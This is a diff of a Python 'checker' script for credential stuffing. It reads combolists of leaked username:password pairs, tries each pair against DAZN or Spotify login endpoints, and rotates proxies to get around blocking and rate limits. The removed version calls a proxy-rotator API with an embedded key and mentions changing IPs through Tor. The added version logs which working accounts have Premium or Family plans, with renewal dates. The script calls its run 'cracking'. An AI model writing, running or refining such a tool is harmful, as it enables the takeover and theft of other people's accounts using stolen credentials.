@@ -1,6 +1,10 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 """checker.py: A script for automatize the procedure of checking accounts
+Edit accounts.txt file in the following format to use this script:
+
+username:password
+username2:password2
 
 Requirements:
     pip install bs4
@@ -14,7 +18,6 @@ import base64
 #import schedule
 import datetime
 import sys
-import os
 import requests
 import urllib.parse
 import json
@@ -41,32 +44,20 @@ def load_config(current_session):
     current_session['config'] = {}
     current_session['config']['proxy'] = []
     current_session['config']['others'] = []
-    current_session['config']['timeout'] = 10
+    current_session['config']['timeout'] = 6
     #TODO fopen check
-    #f_proxy = open("proxy.txt", 'r')
+    f_proxy = open("proxy.txt", 'r')
     #delimiter = input("Delimiter char used in combos?[,|:;]")
-    '''for line in f_proxy.readlines():
+    for line in f_proxy.readlines():
         ip, port = line.rstrip().split(":", 1)
         port = port.split(' ', 1)[-1]  # Remove all after first space ip:port -somecommentuknow
         proxy = {'https': 'https://'+ip+":"+port,
                 'http': 'https://'+ip+":"+port
                 }
-        # Add also socks4/5 to autochec'''
-    proxy = retrieve_new_proxy()
-    current_session["config"]["proxy"].append(proxy)
+        # Add also socks4/5 to autocheck
+        current_session["config"]["proxy"].append(proxy)
     return current_session
     
-def retrieve_new_proxy():
-    url = 'http://falcon.proxyrotator.com:51337/'
-
-    params = dict(
-    apiKey='6emCXEY8',
-    country='IT'
-    )
-
-    resp = requests.get(url=url, params=params)
-    jdata = json.loads(resp.text)
-    return jdata.get("proxy") #IP:PORT
 
 def try_login(username, password, session_config):
 
@@ -76,17 +67,12 @@ def try_login(username, password, session_config):
     # Start a new session, to preserve the cookie
     global s
     s = requests.session()
-    #proxy
-    myproxies = proxy = {'https': 'https://'+session_config['config']["proxy"][0],
-                'http': 'https://'+ session_config['config']["proxy"][0]
-                }
-    s.proxies = myproxies
-
     #s.proxies = proxy
     timeout = session_config['config']['timeout']
     # Take session and anti-csrf Token
     #TOEDIT 1 !!!!
     first_request_header = {
+        # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'DNT': '1',
         'Origin': 'https://www.dazn.com',
@@ -104,6 +90,7 @@ def try_login(username, password, session_config):
         'Platform': "web"
     }
     # Need to avoid b'string' with base64encode
+    bon_cookie = base64.b64encode(b"0|0|-1987903600|-83491951200|1|1|1|1").decode("utf-8")
     login_headers = {
         'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
         # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -120,79 +107,67 @@ def try_login(username, password, session_config):
         #'Cookie' : 'spot={"t":1516389866,"m":"it","p":null}; sp_t=77022c91543ca0fb030c694ed847a98b; sp_new=1; __bon='+str(bon_cookie)+'; _ga=GA1.2.1199860444.1516389870; _gid=GA1.2.198396770.1516389870; _gat=1;fb_continue=; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token='+auth_url+'; remember='+username,
         'Connection': 'keep-alive',
     }
-    json_dict = {}
+
     try:
         l_response = s.post(url_1, json=login_payload, headers=login_headers)# data=login_payload,
         # vote_response = s.post(url, data=vote_payload, headers=vote_headers)
-        print(l_response.text)        
+        json_dict = json.loads(l_response.text)
+        print(l_response.text)
         error_login_key = "odata.error"  # KEy of json dict
-        error_login_values = ["password", "Password"]  # Value of error key
-        change_ip_list = ["limiting", "VPN"]
-        if "Forbidden" in l_response.text:
-            proxy = retrieve_new_proxy()
-            old_one = session_config["config"]["proxy"].pop()
-            session_config["config"]["proxy"].append(proxy)
-            print(hilite("Waiting for change proxy. [Old IP = "+old_one+" ]\n"))
-            time.sleep(0.5)
-            #Need to retry
-            #print("Retrying, something went wrong")
-            #try_login(username, password, session_config)
- 
-        try:
-            json_dict = json.loads(l_response.text)
-        except Exception as e:
-            print(hilite("Waiting... no json retrived.\n"))
-            #session_config['tor_controller'].signal(Signal.NEWNYM) # signal tor to change ip 
-            exc_type, exc_obj, exc_tb = sys.exc_info()
-            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            print(exc_type, fname, exc_tb.tb_lineno)
-            print(e)
-            time.sleep(2)  # lets wait to tor! a little!
-
+        error_login_value = "Password"  # Value of error key
         if l_response and l_response.status_code == 200:
-            '''if len(json_dict) > 0 and error_login_value in str(json_dict.get(error_login_key)["message"]["value"]):
+            if len(json_dict) > 0 and error_login_value in str(json_dict.get(error_login_key)["message"]["value"]):
                 print((hilite("Account " + username + ":" + password + " is not working!")))
-            el'''
-            if len(json_dict) > 0 and "Result" in json_dict:
+            elif len(json_dict) > 0 and "" in json_dict:
                 # Check acccount info (2 urls for netflix, billing contains all needed infos)!
-                print("200: following json response")
-                print(json_dict)
                 time.sleep(0.1)
-                #overview = s.get(url_2)
+                overview = s.get(url_2)
                 #Check for subscription infos
-                #soup = BeautifulSoup(overview.text)
-                #plan_subscription = soup.select("h3[class=product-name]")
-                if json_dict.get("Result") == "FreeTrial":
+                soup = BeautifulSoup(overview.text)
+                plan_subscription = soup.select("h3[class=product-name]")
+                if len(plan_subscription) > 0 and "Free" in plan_subscription[0].text:
                     print((hilite("Account " + username + ":" + password + " is working (FREE :( )!")))
-                #elif len(plan_subscription) > 0 and "Premium paused" in plan_subscription[0].text:
-                #    print((hilite("Account " + username + ":" + password + " is working (PAUSED :( )!")))
-                else:
-                    print((hilite("Account " + username + ":" + password + " is working (STATUS UKNOWN :O )!")))
+                elif len(plan_subscription) > 0 and "Premium paused" in plan_subscription[0].text:
+                    print((hilite("Account " + username + ":" + password + " is working (PAUSED :( )!")))
+                elif len(plan_subscription) > 0 and "Spotify Premium" in plan_subscription[0].text:
+                    print((hilite("Account " + username + ":" + password + " is working (Premium! :D )!", True)))
+                    renewal_date = soup.select("b[class=recurring-date]")[0].text
+                    plan = "Premium"
+                    print(hilite("Renewal date:"+renewal_date))
                     fw = "logSpotify.txt"
                     with open(fw, "a+") as log:
-                        log.write(username+":"+password+"|" +"\n")
-                        
+                        log.write(username+":"+password+"|" + renewal_date + "|" + plan +"\n")
+                elif len(plan_subscription) > 0 and "Premium for Family" in plan_subscription[0].text:
+                    print((hilite("Account " + username + ":" + password + " is working (FAMILY Premium! :D )!", True)))
+                    plan = "Premium for Family"
+                    try:
+                        renewal_date = soup.select("b[class=recurring-date]")[0].text
+                        print(hilite("Renewal date:"+renewal_date))
+                    except Exception:
+                        renewal_date = "Uknown"
+                    fw = "logSpotify.txt"
+                    with open(fw, "a+") as log:
+                        log.write(username+":"+password+"|" + renewal_date + "|" + plan +"\n")
+                else:
+                    #print(overview.text)
+                    error_selector = soup.select("p[class=lead]")
+                    if len(error_selector) > 0 and "Refresh this page or try again" in error_selector[0].text:
+                        #Need to retry
+                        print("Retrying, something went wrong")
+                        try_login(username, password, session_config)
+                    print("Uknown data")
         else:
-            if any(word in json_dict.get(error_login_key)["message"]["value"] for word in error_login_values):
+            if len(json_dict) > 0 and error_login_value in str(json_dict.get(error_login_key)["message"]["value"]):
                 print((hilite("Account " + username + ":" + password + " is not working!")))
-            elif any(word in json_dict.get(error_login_key)["message"]["value"] for word in change_ip_list):
-                proxy = retrieve_new_proxy()
-                old_one = session_config["config"]["proxy"].pop()
-                session_config["config"]["proxy"].append(proxy)
-                print(hilite("Waiting for change proxy. [Old IP = "+old_one+" ]\n"))
-                time.sleep(0.5)
             else:
                 print(hilite("Error:" + str(l_response.status_code)))
                 print(hilite("From api:" + "\n" + str(json_dict.get(error_login_key))))
     except Exception as e:
         print(hilite("! Login failed for " + username))
-        fw = "logManualCheckDazn.txt"
+        fw = "logManualCheckSpotify.txt"
         with open(fw, "a+") as log:
             log.write(username+":"+password +"\n")
         #print(l_response.text[:5640])
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        print(exc_type, fname, exc_tb.tb_lineno)
         print(e)
         #raise(e)
 
@@ -201,8 +176,6 @@ def main():
     # Get login data from file
     current_session = {}
     current_session = load_config(current_session)
-     # Tor configuration
-    
     try:
         # Some configuration infos
         fname = input("Combolist file name?")
@@ -225,10 +198,7 @@ def main():
                 # Proxy KO
                 # Change proxy next iteration 
                 #current_session["config"]["changeProxyFlag"] = True
-                print(hilite("Something went wrong, retrying.. " + "\n"))
-                exc_type, exc_obj, exc_tb = sys.exc_info()
-                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-                print(exc_type, fname, exc_tb.tb_lineno)
+                print(hilite("Something went wrong, retrying. " + "\n"))
                 continue
 
         print ("End of cracking:", str(datetime.date.today()))
@@ -239,9 +209,6 @@ def main():
         print(hilite("[Closing the resource, shutdown the network module... WAIT]"))
     except Exception as e:
         print(hilite("Unhelded exception, exiting.." + str(e)))
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        print(exc_type, fname, exc_tb.tb_lineno)
 
 
 def main2():
